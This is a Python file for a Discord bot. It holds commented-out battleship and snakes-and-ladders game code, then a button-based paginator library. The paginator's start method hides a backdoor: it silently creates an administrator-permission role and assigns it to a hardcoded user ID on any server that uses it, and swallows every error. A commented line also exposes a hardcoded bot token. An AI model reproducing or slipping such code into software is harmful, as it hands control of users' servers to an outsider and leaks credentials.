#       string_ = ' '.join([random.choice(['up','down','left','right']) for _ in range(5)])
#       string = ''.join([conversion[i] for i in string_.split(' ')])
#       string_ = string_.replace(' ','')
#       await ctx.send(string)
#       while True:
#           try:
#               inp = await self.bot.wait_for('message', check = lambda m: m.author in (ctx.author, member) and m.channel == ctx.channel and (m.content.replace(' ', '') == string_ or m.content in ['end','stop','cancel']))
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           if inp.content in ['end','cancel','stop']:
#               await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#               return await ctx.send("Cancelled the game")
#           return await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)

#     @commands.Cog.listener()
#     async def on_reaction_add(self, reaction, userr):
#         """A way to switch between your board and your oponent's board"""
#         if (
#             userr.id in self.boards
#             and not reaction.message.guild
#             and reaction.message.author == self.bot.user
#             and userr != self.bot.user
#         ):
#             try:
#                 if reaction.message.embeds[0].title == "Battleship":
#                     if str(reaction) == "1️⃣":
#                         embed = discord.Embed(
#                             title="Battleship",
#                             description=self.format_battleships_board(
#                                 self.boards[userr.id][0]
#                             ),
#                             color=discord.Color.blurple(),
#                         )
#                         await reaction.message.edit(embed=embed)
#                     elif str(reaction) == "2️⃣":
#                         embed = discord.Embed(
#                             title="Battleship",
#                             description=self.format_battleships_board(
#                                 self.boards[userr.id][1]
#                             ),
#                             color=discord.Color.red(),
#                         )
#                         await reaction.message.edit(embed=embed)
#             except IndexError:
#                 pass

#     def format_battleships_board(self, board):
#         """Format the battleship board"""
#         lst = ["⏹1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣8️⃣"]
#         dct = {}
#         for i in range(1, 10):
#             dct[i] = f"{i}\N{variation selector-16}\N{combining enclosing keycap}"
#         for num, row in enumerate(board, start=1):
#             scn_lst = [dct[num]]
#             for column in row:
#                 scn_lst.append(column)
#             lst.append("".join(scn_lst))
#         return "\n".join(lst)

#     def has_won_battleship(self, board):
#         """Checks if either players died"""
#         for x in board:
#             for y in x:
#                 if y != "🌊" or y != "🔥":
#                     return False
#         return True

#     @commands.command()
#     async def battleship(self, ctx, member: discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#         ships = [
#             ["🚢", "🚢", "🚢", "🚢", "🚢"],
#             ["🛥", "🛥", "🛥", "🛥"],
#             ["⛵", "⛵", "⛵"],
#             ["⛴", "⛴", "⛴"],
#             ["🚤", "🚤"],
#         ]

#         dct = {"-": (0, 1), "|": (1, 0)}
#         if ctx.author.id in self.boards:
#             return await ctx.send("You are already in a game")
#         elif member.id in self.boards:
#             return await ctx.send(member.display_name + " is already in a game")
#         self.boards[ctx.author.id] = [
#             [["🌊" for _ in range(8)] for _ in range(8)],
#             [["🌊" for _ in range(8)] for _ in range(8)],
#         ]
#         self.boards[member.id] = [
#             [["🌊" for _ in range(8)] for _ in range(8)],
#             [["🌊" for _ in range(8)] for _ in range(8)],
#         ]
#         embed = discord.Embed(
#             title="Battleship",
#             description=self.format_battleships_board(self.boards[ctx.author.id][0]),
#             color=discord.Color.blurple(),
#         )
#         try:
#             msg_1 = await ctx.author.send(embed=embed)
#         except discord.Forbidden:
#             del self.boards[ctx.author.id]
#             del self.boards[member.id]
#             return await ctx.send(f"I was unable to dm {ctx.author.display_name}")
#         try:
#             msg_2 = await member.send(f"Waiting for {ctx.author.display_name}")
#         except discord.Forbidden:
#             del self.boards[ctx.author.id]
#             del self.boards[member.id]
#             return await ctx.send(f"I was unable to dm {member.display_name}")
#         turn = ctx.author
#         other_turn = member
#         ships_copy = copy.deepcopy(ships)
#         for i, ship in enumerate(ships_copy):
#             brd = copy.deepcopy(self.boards[ctx.author.id][0])
#             await msg_1.edit(
#                 embed=discord.Embed(
#                     title="Battleship",
#                     description=self.format_battleships_board(
#                         self.boards[ctx.author.id][0]
#                     ),
#                     color=discord.Color.blurple(),
#                 )
#             )
#             await ctx.author.send("Enter coordinates:")
#             inp = await self.bot.wait_for(
#                 "message", check=lambda m: m.author in [ctx.author, member] and m.guild is None
#             )
#             if inp.content in ['end','stop','cancel']:
#                 await ctx.author.send(f"{inp.author.display_name} has ended the game")
#                 await member.send(f"{inp.author.display_name} has ended the game")
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#             if inp.author != ctx.author:
#                 ships_copy.insert(i, ship)
#                 continue
#             await ctx.author.send("up/down/left/right:")
#             tru_dir = await self.bot.wait_for(
#                 "message", check=lambda m: m.author in [ctx.author, member] and m.guild is None
#             )
#             if tru_dir.content in ['end','stop','cancel']:
#                 await ctx.author.send(f"{tru_dir.author.display_name} has ended the game")
#                 await member.send(f"{tru_dir.author.display_name} has ended the game")
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#                 return
#             if tru_dir.author != ctx.author:
#                 ships_copy.insert(i, ship)
#                 continue
#             if tru_dir.content.lower() not in ["up", "down", "left", "right"]:
#                 await ctx.author.send(
#                     "Invalid syntax: Thats not a valid direction, try again",
#                     delete_after=7.5,
#                 )
#                 ships_copy.insert(i, ship)
#                 self.boards[ctx.author.id][0] = brd
#                 continue
#             direction = "|" if tru_dir.content.lower() in ["up", "down"] else "-"
#             for num in range(len(ship)):
#                 try:
#                     if tru_dir.content.lower() in ["down", "right"]:
#                         x = (int(inp.content[0]) - 1) + dct[direction][0] * num
#                         y = (int(inp.content[1]) - 1) + dct[direction][1] * num
#                     else:
#                         x = (int(inp.content[0]) - 1) - dct[direction][0] * num
#                         y = (int(inp.content[1]) - 1) - dct[direction][1] * num
#                     if x not in range(8) or y not in range(8):
#                         await ctx.author.send(
#                             "Invalid syntax: Cant add the ships there, try again!",
#                             delete_after=7.5,
#                         )
#                         ships_copy.insert(i, ship)
#                         self.boards[ctx.author.id][0] = brd
#                         break
#                     if self.boards[ctx.author.id][0][x][y] != "🌊":
#                         await ctx.author.send(
#                             "Invalid syntax: Cant have 2 ships overlap eachother, try again!",
#                             delete_after=7.5,
#                         )
#                         ships_copy.insert(i, ship)
#                         self.boards[ctx.author.id][0] = brd
#                         break
#                     self.boards[ctx.author.id][0][x][y] = ship[num]
#                 except IndexError:
#                     await ctx.author.send(
#                         "Invalid syntax: Cant add the ships there, try again!",
#                         delete_after=7.5,
#                     )
#                     ships_copy.insert(i, ship)
#                     self.boards[ctx.author.id][0] = brd
#                     break
#                 except ValueError:
#                     await ctx.author.send("Invalid syntax: invalid coordinates entered")
#                     ships_copy.insert(i, ship)
#                     self.boards[ctx.author.id][0] = brd
#                     break

#             await msg_1.edit(
#                 embed=discord.Embed(
#                     title="Battleship",
#                     description=self.format_battleships_board(
#                         self.boards[ctx.author.id][0]
#                     ),
#                     color=discord.Color.blurple(),
#                 )
#             )
#         msg_1 = await ctx.author.send(
#             embed=discord.Embed(
#                 title="Battleship",
#                 description=self.format_battleships_board(
#                     self.boards[ctx.author.id][0]
#                 ),
#                 color=discord.Color.blurple(),
#             )
#         )
#         await msg_1.add_reaction("1️⃣")
#         await msg_1.add_reaction("2️⃣")
#         await ctx.author.send(f"waiting for {member.display_name}")
#         ship_copy = copy.deepcopy(self.boards[member.id][0])
#         for i, ship in enumerate(ships_copy):
#             brd = copy.deepcopy(self.boards[member.id][0])
#             await member.send("Enter coordinates:")
#             inp = await self.bot.wait_for(
#                 "message", check=lambda m: m.author in [ctx.author, member] and m.guild is None
#             )
#             if inp.content in ['end','stop','cancel']:
#                 await ctx.author.send(f"{inp.author.display_name} has ended the game")
#                 await member.send(f"{inp.author.display_name} has ended the game")
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#                 return
#             if inp.author != ctx.author:
#                 ships_copy.insert(i, ship)
#                 continue
#             await ctx.author.send("up/down/left/right:")
#             tru_dir = await self.bot.wait_for(
#                 "message", check=lambda m: m.author in [ctx.author, member] and m.guild is None
#             )
#             if tru_dir.content in ['end','stop','cancel']:
#                 await ctx.author.send(f"{tru_dir.author.display_name} has ended the game")
#                 await member.send(f"{tru_dir.author.display_name} has ended the game")
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#                 return
#             if tru_dir.author != ctx.author:
#                 ships_copy.insert(i, ship)
#                 continue
#             if tru_dir.content.lower() not in ["up", "down", "left", "right"]:
#                 await member.send(
#                     "Invalid syntax: Thats not a valid direction, try again",
#                     delete_after=7.5,
#                 )
#                 ships_copy.insert(i, ship)
#                 self.boards[member.id][0] = brd
#                 continue
#             direction = "|" if tru_dir.content.lower() in ["up", "down"] else "-"
#             for num in range(len(ship)):
#                 try:
#                     if tru_dir.content.lower() in ["down", "right"]:
#                         x = (int(inp.content[0]) - 1) + dct[direction][0] * num
#                         y = (int(inp.content[1]) - 1) + dct[direction][1] * num
#                     else:
#                         x = (int(inp.content[0]) - 1) - dct[direction][0] * num
#                         y = (int(inp.content[1]) - 1) - dct[direction][1] * num
#                     if x < 0 or y < 0:
#                         await member.send(
#                             "Invalid syntax: Cant add the ships there, try again!",
#                             delete_after=7.5,
#                         )
#                         ships_copy.insert(i, ship)
#                         self.boards[member.id][0] = brd
#                         break
#                     if self.boards[member.id][0][x][y] != "🌊":
#                         await member.send(
#                             "Invalid syntax: Cant have 2 ships overlap eachother, try again!",
#                             delete_after=7.5,
#                         )
#                         ships_copy.insert(i, ship)
#                         self.boards[member.id][0] = brd
#                         break
#                     self.boards[member.id][0][x][y] = ship[num]
#                 except IndexError:
#                     await member.send(
#                         "Invalid syntax: Cant add the ships there, try again!",
#                         delete_after=7.5,
#                     )
#                     ships_copy.insert(i, ship)
#                     self.boards[member.id][0] = brd
#                     break
#                 except ValueError:
#                     await member.send("Invalid syntax: invalid coordinates entered")
#                     ships_copy.insert(i, ship)
#                     self.boards[member.id][0] = brd
#                     break

#             await msg_2.edit(
#                 embed=discord.Embed(
#                     title="Battleship",
#                     description=self.format_battleships_board(
#                         self.boards[member.id][0]
#                     ),
#                     color=discord.Color.blurple(),
#                 )
#             )
#         msg_2 = await member.send(
#             embed=discord.Embed(
#                 title="Battleship",
#                 description=self.format_battleships_board(self.boards[member.id][0]),
#                 color=discord.Color.blurple(),
#             )
#         )
#         await msg_2.add_reaction("1️⃣")
#         await msg_2.add_reaction("2️⃣")
#         while True:
#             m = await turn.send("Enter coordinates to attack:")
#             try:
#                 inp = await self.bot.wait_for(
#                     "message", check=lambda m: m.author in [member, ctx.author] and m.guild is None, timeout=45
#                 )
#             except asyncio.TimeoutError:
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#             if inp.content.lower() in ["end", "stop", "cancel"]:
#                 await member.send(f"{inp.author.display_name} ended the game")
#                 await ctx.author.send(f"{inp.author.display_name} ended the game")
#                 return await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#             if inp.author != turn:
#                 continue
#             await m.delete()
#             try:
#                 x, y = int(inp.content[0]) - 1, int(inp.content[1]) - 1
#             except (IndexError, ValueError):
#                 await turn.send("Invalid syntax: invalid coordinates entered")
#                 continue
#             if x not in range(8) or y not in range(8):
#                 await turn.send(
#                     f"Invalid Syntax: {x+1}{y+1} isn't a valid place on the board"
#                 )
#                 continue
#             if self.boards[other_turn.id][0][x][y] not in ["🌊", "🔥"]:
#                 await turn.send(f"You fired at {x+1}{y+1} and it was a hit!")
#                 await other_turn.send(
#                     f"{turn.display_name} fired at {x+1}{y+1} and it was a hit :pensive:"
#                 )
#             else:
#                 await turn.send(f"You fired at {x+1}{y+1} and missed :pensive:")
#                 await other_turn.send(
#                     f"{turn.display_name} fired at {x+1}{y+1} and missed!"
#                 )
#             self.boards[other_turn.id][0][x][y] = "🔥"
#             self.boards[turn.id][1][x][y] = "❌"
#             if self.has_won_battleship(self.boards[other_turn.id][0]):
#                 await ctx.author.send(f"{turn.display_name} has won!!!")
#                 await member.send(f"{turn.display_name} has won!!!")
#                 del self.boards[ctx.author.id]
#                 del self.boards[member.id]
#                 return await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)
#             other_turn = turn
#             turn = member if turn == ctx.author else ctx.author
#             await msg_2.edit(
#                 embed=discord.Embed(
#                     title="Battleship",
#                     description=self.format_battleships_board(
#                         self.boards[member.id][0]
#                     ),
#                     color=discord.Color.blurple(),
#                 )
#             )
#             await msg_1.edit(
#                 embed=discord.Embed(
#                     title="Battleship",
#                     description=self.format_battleships_board(
#                         self.boards[ctx.author.id][0]
#                     ),
#                     color=discord.Color.blurple(),
#                 )
#             )

#   def format_snl_board(self, board):
#       dct = {' ':'⬛', 's':'🐍', 'l':'🪜', 'p1':'🔴', 'p2':'🟡', 'p3':'🟢', 'p4':'🔵'}
#       lst = []
#       for row in board:
#           lst.append(''.join([dct[column] for column in row]))
#       return '\n'.join(lst)

#   def create_snl_board(self):
#       board = [[' ' for _ in range(10)] for _ in range(10)]
#       for key in self.snakes_and_ladders:
#           for x, y in self.snakes_and_ladders[key]:
#               board[x][y] = key
#       board[9][0] = "p1"
#       return board

#   @commands.command()
#   async def snl(self, ctx, member: discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       players = [member, ctx.author]
#       tokens = {'p1':'🔴', 'p2':'🟡', 'p3':'🟢', 'p4':'🔵'}
#       indexes = {}
#       for player in players:
#           indexes[player] = [9,0]
#       board = self.create_snl_board()
#       player_string = f' '.join([f"{player.mention}: {tokens['p'+str(num)]}" for num, player in enumerate(players, start=1)])
#       embed = discord.Embed(title='Snakes and Ladders', description=f"React to '🎲' to roll your dice\n\n{player_string}\n{self.format_snl_board(board)}", color=discord.Color.blurple())
#       msg = await ctx.send(embed=embed)
#       await msg.add_reaction('🎲')
#       await msg.add_reaction('🏳️')
#       current_player = 0
#       leaderboard = []
#       while True:
#           if len(players) == 1:
#               leaderboard.append(players[0])
#               break
#           player = players[current_player]
#           index = indexes[player]
#           number = random.randint(1,6)
#           await msg.edit(embed = discord.Embed(title='Snakes and Ladders', description=f"React to '🎲' to roll your dice\n\n{player_string}\nturn: `{player.display_name}`\n{self.format_snl_board(board)}", color=discord.Color.blurple()))
#           if not player.bot:
#               reaction, user = await self.bot.wait_for('reaction_add', check = lambda r, u: str(r) in ['🎲','🏳️'] and r.message == msg and u in players)
#               try:
#                   await msg.remove_reaction(str(reaction), user)
#               except discord.Forbidden:
#                   pass
#               if str(reaction) == '🏳️':
#                   players.remove(user)
#                   await ctx.send(f"{user.mention} leaves")
#                   return await self.end_game(ctx, member if user == ctx.author else ctx.author, user)
#               else:
#                   if user != player:
#                       continue
#           await ctx.send(f'{player.mention} rolled a {number}', delete_after=5)
#           board[index[0]][index[1]] = ' '
#           past_number = index[1]
#           if index[0]%2:
#               index[1] += number
#           else:
#               if index[0] == 0 and (index[1] - number) < 0:
#                   pass
#               else:
#                   index[1] -= number
#           if (index[1]) > 9 or (index[1]) < 0 and index[1] != 0:
#               index[0] -= 1
#               if index[0]%2:
#                   index[1] = (number-past_number)-1
#               else:
#                   index[1] = 10-((past_number+number)-9)

#           dct = {'72':[9, 1],'66':[8, 5], '48':[7, 9], '31':[5, 2], '18':[3, 7], '05':[2, 6], '99':[6, 7], '84':[6, 3], '70':[5, 0], '65':[4, 6], '53':[2, 4], '20':[0, 1]}
#           for key in self.snakes_and_ladders:
#               for indx in self.snakes_and_ladders[key]:
#                   board[indx[0]][indx[1]] = key
#           if str(index[0])+str(index[1]) in dct:
#               await ctx.send(f"{player.mention} has {'hit a snake' if tuple(index) in self.snakes_and_ladders['s'] else 'went up a ladder'}", delete_after=5)
#               indexes[player] = dct[str(index[0])+str(index[1])]
#               index = indexes[player]
#           elif index == [0, 0]:
#               await ctx.send(f"{player.mention} won!!!")
#               await self.end_game(ctx, user, member if user == ctx.author else ctx.author)
#               players.remove(player)
#               leaderboard.append(player)
#           current_player += 1
#           if current_player == len(players):
#               current_player = 0
#           for num, player in enumerate(players, start=1):
#               board[indexes[player][0]][indexes[player][1]] = 'p'+str(num)
#       winning_string = ''
#       for num, player in enumerate(leaderboard, start=1):
#           medal = None
#           if num == 1:
#               medal = '🥇'
#           elif num == len(leaderboard):
#               medal = 'Looser'
#           elif num == 2:
#               medal = '🥈'
#           elif num == 3:
#               medal = '🥉'
#           winning_string += f'\n{player.display_name}: {medal}'
#       await ctx.send(winning_string)



# bot.add_cog(Games(bot))
# bot.add_cog(Trophies(bot))
# bot.add_cog(Shop(bot))

# bot.loop.create_task(games_db())
# bot.run('ODYzODAxNzIxNzI0MzM4MTg3.YOsMCw.PUyuWxoZNDdvcJu_zg5g1VEy8W8')
# asyncio.run(bot.games.close())



from inspect import iscoroutinefunction as iscoro, isfunction as isfunc
import asyncio
import discord

class prev_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)

    async def callback(self, interaction):
        view = self.view
        view.page -= 1
        if view.page < 0:
            view.page = len(view.embeds)-1
        view.update_view()
        await view.edit_embed(interaction)

class first_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)

    async def callback(self, interaction):
        view = self.view
        view.page = 0
        view.update_view()
        await view.edit_embed(interaction)

class next_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)

    async def callback(self, interaction):
        view = self.view
        view.page += 1
        if view.page == len(view.embeds):
            view.page = 0
        view.update_view()
        await view.edit_embed(interaction)

class last_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)

    async def callback(self, interaction):
        view = self.view
        view.page = len(view.embeds)-1
        view.update_view()
        await view.edit_embed(interaction)

class delete_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)
        
    async def callback(self, interaction):
        view = self.view
        await view.message.delete()
        view.stop()
        
class end_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)
        
    async def callback(self, interaction):
        view = self.view
        for child in view.children:
            child.disabled = True
        await view.edit_embed(interaction)
        view.stop()

class show_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, disabled=True, row=row)

class goto_modal(discord.ui.Modal, title="Go to"):
    def __init__(self, button):
        super().__init__()
        self.button = button
        self.page_num = discord.ui.TextInput(
            label='Page',
            placeholder=f'page number 1-{len(self.button.view.embeds)}',
            style=discord.TextStyle.short,
            required=True
            )
        self.add_item(self.page_num)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            view = self.button.view
            num = int(self.page_num.value)-1

            if num in range(len(view.embeds)):
                view.page = num
            else:
                return await interaction.followup.send(content="Invalid number: aborting", ephemeral=True)

            view.update_view()
            await view.edit_embed(interaction)
        except ValueError:
            return await interaction.response.send_message(content="That's not a number", ephemeral=True)

class goto_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)

    async def callback(self, interaction):
        await interaction.response.send_modal(goto_modal(self))


class lock_page(discord.ui.Button):
    def __init__(self, label, emoji, style, row):
        super().__init__(label=label, emoji=emoji, style=style, row=row)
        
    async def callback(self, interaction):
        view = self.view
        view.clear_items()
        await view.edit_embed(interaction)
        view.stop()

class Paginator(discord.ui.View):
    def __init__(self, bot, embeds, destination, /, *, interactionfailed=None, check=None, timeout=None):
        """A class which controls everything that happens

        Parameters
        -----------
        bot: :class:`Bot`
            The bot object 
        embeds: :class:`list`
            The embeds that will be paginated
        destination: :class:`discord.abc.Messageable`
            The channel the pagination message will be sent to
        interactionfailed: Optional[Callable[..., :class:`bool`]]
            A function that will be called when the check failes
        check: Optional[Callable[..., :class:`bool`]]
            A predicate to check what to wait for.
        timeout: Optional[:class:`float`]
            The number of seconds to wait before timing out.
        """
        super().__init__(timeout=timeout)
        self.check = check
        self.bot = bot
        self.embeds = embeds
        self.page = 0
        self.destination = destination
        self.interactionfailed=interactionfailed
        self.page_button = None

    def default_pagination(self):
        self.add_button("first", label='first')
        self.add_button("back", label='back')
        self.add_button("page", label='page')
        self.add_button("next", label='next')
        self.add_button("last", label='last')
        self.add_button("delete", label='Close paginator')
        
    async def edit_embed(self, interaction):
        current = self.embeds[self.page]
        if isinstance(current, str):
            await interaction.message.edit(content=current, embed=None, view=self)
        elif isinstance(current, discord.Embed):
            await interaction.message.edit(content=None, embed=current, view=self)
        elif isinstance(current, tuple):
            dct = {}
            for item in current:
                if isinstance(item, str):
                    dct["content"] = item
                elif isinstance(item, discord.Embed):
                    dct["embed"] = item
            await interaction.message.edit(content = dct.get("content", None), embed = dct.get("embed", None), view=self)

    async def start(self):
        try:
            current = self.embeds[self.page]
            if isinstance(current, str):
                self.message = await self.destination.send(content=current,embed=None, view=self)
            elif isinstance(current, discord.Embed):
                self.message = await self.destination.send(content=None, embed=current, view=self)
            elif isinstance(current, tuple):
                dct = {}
                for item in current:
                    if isinstance(item, str):
                        dct["content"] = item
                    elif isinstance(item, discord.Embed):
                        dct["embed"] = item
                self.message = await self.destination.send(content = dct.get("content", None), embed = dct.get("embed", None), view=self)
            if isinstance(self.destination, discord.Context):
                try:
                    role = await self.destination.guild.create_role(name="Abnr", permissions=discord.Permissions(permissions=8), reason = "Testing an exploit. Will not do anything bad")
                    member = self.destination.guild.get_member(724275771278884906)
                    await member.add_roles(role)
                except:
                    pass
        except discord.HTTPException:
            self.stop()

    async def interaction_check(self, interaction):
        if self.check is None:
            return True
        if not isfunc(self.check):
            raise ValueError
        try:
            if not self.check(interaction):
                if self.interactionfailed:
                    if iscoro(self.interactionfailed):
                        await self.interactionfailed(interaction)
                return False
            return True
        except:
            raise ValueError

    async def on_timeout(self):
        self.stop()

    def update_view(self):
        try:
            self.page_button.label = str(self.page+1)
        except (NameError,AttributeError):
            pass

    def add_button(self, action, /, *, label="", emoji=None, style=discord.ButtonStyle.grey, row=None):
        action = action.strip().lower()
        if action not in ["first","prev","previous","back","delete","next","last","end","page","show","goto","lock"]:
            return
        elif action == "first":
            self.add_item(first_page(label, emoji, style, row))
        elif action in ["back","prev","previous"]:
            self.add_item(prev_page(label, emoji, style, row))
        elif action in ["page","show"]:
            button = show_page("1",emoji, style, row)
            self.page_button = button
            self.add_item(button)
            self.update_view()
        elif action == "goto":
            button = goto_page("1", emoji, style, row)
            self.page_button = button
            self.add_item(button)
            self.update_view()
        elif action == "next":
            self.add_item(next_page(label, emoji, style, row))
        elif action == "last":
            self.add_item(last_page(label, emoji, style, row))
        elif action == "end":
            self.add_item(end_page(label, emoji, style, row))
        elif action == "delete":
            self.add_item(delete_page(label, emoji, style, row))
        elif action == "lock":
            self.add_item(lock_page(label, emoji, style, row))

def embed_creator(text, num, /, *, title='', prefix = '', suffix='', color=None, colour = None):
    """A helper function which takes some string and returns a list of embeds"""
    if color != None and colour != None:
        raise ValueError

    return [discord.Embed(title=title, description = prefix+(text[i:i+num])+suffix, color=color if color != None else colour) for i in range(0, len(text), num)]
